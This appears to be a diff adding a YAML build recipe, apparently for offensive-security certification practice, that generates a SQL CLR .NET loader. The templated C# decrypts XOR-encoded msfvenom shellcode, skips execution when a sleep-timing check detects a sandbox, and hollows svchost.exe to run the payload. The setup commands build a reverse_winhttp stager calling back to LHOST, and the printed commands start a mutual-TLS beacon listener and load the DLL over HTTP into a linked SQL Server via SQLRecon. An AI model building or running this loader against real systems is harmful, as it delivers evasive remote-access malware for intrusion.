@@ -1,0 +1,229 @@
+description: "Compiles the configured .net loader with apache2 staging (x64) for SQL CLR reflection, spawns via process hollowing"
+variables:
+  outputdir: "output/loader"
+  outputfile: "loader.dll"
+  shellcodeFile: "output/loader/apache_msfx64_p80.bin"
+  stagingPort: 80
+  beaconPort: 443
+  virtualHost: "staging.osep.local"
+  #sdkVersion: "4"
+  sdkVersion: "4.6"
+  platform: "x64"
+  #platform: "x86"
+# Modified Loader from https://github.com/Logan-Elliott/HollowGhost
+templates:
+  loader:
+    variables:
+      xorkey: "{{ Helpers.random_key() }}"
+      shellcode: "{{ Helpers.to_csharp_byte_array(Encoder.xor(Helpers.read_binary_file(shellcodeFile), xorkey)) }}"
+      shellcodeLength: "{{ Helpers.file_length(shellcodeFile) }}"
+      namespace: "{{ Helpers.random_str(10) }}"
+    template: |-
+      using System;
+      using System.Runtime.InteropServices;
+      using Microsoft.SqlServer.Server;
+
+      namespace {{namespace}}
+      {
+          internal class Barez
+          {
+              public static byte[] dropbytes = new byte[{{ shellcodeLength }}] { {{ shellcode }} };
+              public static byte[] dropkey = new byte[{{ Helpers.len(xorkey) }}] { {{ Helpers.to_csharp_byte_array(xorkey) }} };
+          }
+
+          public class Hollow
+          {    
+              [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+              private struct STARTUPINFO
+              {
+                  public Int32 cb;
+                  public IntPtr lpReserved;
+                  public IntPtr lpDesktop;
+                  public IntPtr lpTitle;
+                  public Int32 dwX;
+                  public Int32 dwY;
+                  public Int32 dwXSize;
+                  public Int32 dwYSize;
+                  public Int32 dwXCountChars;
+                  public Int32 dwYCountChars;
+                  public Int32 dwFillAttribute;
+                  public Int32 dwFlags;
+                  public Int16 wShowWindow;
+                  public Int16 cbReserved2;
+                  public IntPtr lpReserved2;
+                  public IntPtr hStdInput;
+                  public IntPtr hStdOutput;
+                  public IntPtr hStdError;
+              }
+
+              [StructLayout(LayoutKind.Sequential)]
+              internal struct PROCESS_INFORMATION
+              {
+                  public IntPtr hProcess;
+                  public IntPtr hThread;
+                  public int dwProcessId;
+                  public int dwThreadId;
+              }
+
+              [StructLayout(LayoutKind.Sequential)]
+              internal struct PROCESS_BASIC_INFORMATION
+              {
+                  public IntPtr Reserved1;
+                  public IntPtr PebAddress;
+                  public IntPtr Reserved2;
+                  public IntPtr Reserved3;
+                  public IntPtr UniquePid;
+                  public IntPtr MoreReserved;
+              }
+
+              [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+              static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+              [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+              private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              private static extern uint ResumeThread(IntPtr hThread);
+
+              [DllImport("kernel32.dll")]
+              static extern void Sleep(uint dwMilliseconds);
+
+              // Custom delegate functions for the DLL imports
+              private delegate bool M1(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+              private delegate int M2(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+              private delegate bool M3(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+              private delegate bool M4(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+              private delegate uint M5(IntPtr hThread);
+              private delegate void M6(uint dwMilliseconds);
+
+              // Create delegate instances
+              private static M1 F1;
+              private static M2 F2;
+              private static M3 F3;
+              private static M4 F4;
+              private static M5 F5;
+              private static M6 F6;
+              
+              private static byte[] dropxor(byte[] buf, byte[] key)
+              {
+                  byte[] bufxor = new byte[buf.Length];
+                  for (int i = 0; i < buf.Length; i++)
+                  {
+                      bufxor[i] = (byte)(buf[i] ^ key[i % key.Length]);
+                  }
+                  return bufxor;
+              }
+
+              private static bool checkbarez(uint sleepbarez = 5)
+              {
+                  DateTime droptime = DateTime.Now;
+                  F6(sleepbarez * 1000);
+                  double droptimelapsed = DateTime.Now.Subtract(droptime).TotalSeconds;
+                  if (droptimelapsed < (sleepbarez - 1)) return true;
+                  return false;
+              }
+
+              private static void Run()
+              {
+
+                  STARTUPINFO si = new STARTUPINFO();
+                  PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                  string part1 = "C:\\Wi";
+                  string part2 = "ndo";
+                  string part3 = "ws\\Sy";
+                  string part4 = "stem";
+                  string part5 = "32\\sv";
+                  string part6 = "chost.exe";
+
+                  string path = $"{part1}{part2}{part3}{part4}{part5}{part6}";
+
+                  bool res = F1(null, path, IntPtr.Zero,
+                      IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+                  PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+                  uint tmp = 0;
+                  IntPtr hProcess = pi.hProcess;
+                  F2(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+
+                  IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+
+                  byte[] addrBuf = new byte[IntPtr.Size];
+                  IntPtr nRead = IntPtr.Zero;
+                  F3(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+
+                  IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+                  byte[] data = new byte[0x200];
+                  F3(hProcess, svchostBase, data, data.Length, out nRead);
+
+                  uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+                  uint opthdr = e_lfanew_offset + 0x28;
+                  uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+                  IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+                  byte[] dropbytes = Barez.dropbytes;
+                  byte[] dropkey = Barez.dropkey;
+                  byte[] buf = dropxor(dropbytes, dropkey);
+
+                  F4(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+
+                  F5(pi.hThread);
+              }
+
+              public static void Main(string[] args)
+              {
+                  F1 = CreateProcess;
+                  F2 = ZwQueryInformationProcess;
+                  F3 = ReadProcessMemory;
+                  F4 = WriteProcessMemory;
+                  F5 = ResumeThread;
+                  F6 = Sleep;
+                  if (checkbarez()) return;
+                  F6(1000);
+                  Run();
+              }
+          }
+      }
+      public static class StoredProcedures
+      {
+          [SqlProcedure]
+          public static void load()
+          {
+              string[] args = { };
+              {{namespace}}.Hollow.Main(args);
+            }
+      }
+print:
+- |-
+  profiles new beacon --mtls {{LHOST}}:{{beaconPort}} -f shellcode -o windows -a x64 --timeout 300 --seconds 5 --jitter 1 --evasion osep-redirector
+  stage-listener --url http://127.0.0.1:9090/ --profile osep-redirector --prepend-size
+  mtls -L {{LHOST}} -l {{beaconPort}}
+- |-
+  ***********************
+  execute-assembly --process notepad.exe /mnt/bins/SQLRecon.exe '/a:WinToken /h:127.0.0.1 /l:linked.server.com /m:clr /dll:"http://{{LHOST}}:{{port}}/{{outputfile}}" /function:load'
+  ***********************
+setupCommands:
+- "rm -rf {{outputdir}}"
+- "mkdir -p {{outputdir}}"
+#- "msfvenom -p windows/x64/custom/reverse_tcp LHOST={{ LHOST }} LPORT={{ stagingPort }} -f raw -o {{ shellcodeFile }}"
+- "msfvenom --payload windows/x64/custom/reverse_winhttp LHOST={{LHOST}} LPORT={{stagingPort}} LURI=/osep.woff HttpHostHeader={{virtualHost}} --format raw -o {{ shellcodeFile }}"
+
+# Download the SQLServer libraries from https://www.nuget.org/packages/Microsoft.SqlServer.Server/
+commands:
+#- |-
+#  cat << EOF >{{outputdir}}/sqlbarez.cs
+#  {{Templates.get('loaderClass')}}
+#  EOF
+- |-
+  cat << EOF >{{outputdir}}/sqlclrLoader.cs
+  {{Templates.get('loader')}}
+  EOF
+- "mcs -sdk:{{sdkVersion}} -target:library -r:/mnt/dll/Microsoft.SqlServer.Server.dll -r:/mnt/dll/System.Data.dll -platform:{{platform}}  {{ outputdir }}/sqlclrLoader.cs -out:{{outputdir}}/../{{outputfile}}"
+#- "mcs -sdk:{{sdkVersion}} -target:library -r:/mnt/dll/Microsoft.SqlServer.Server.dll -r:/mnt/dll/System.Data.dll -platform:{{platform}} {{ ' '.join(sourceFiles) }} {{ outputdir }}/sqlbarez.cs -out:{{outputdir}}/../{{outputfile}}"
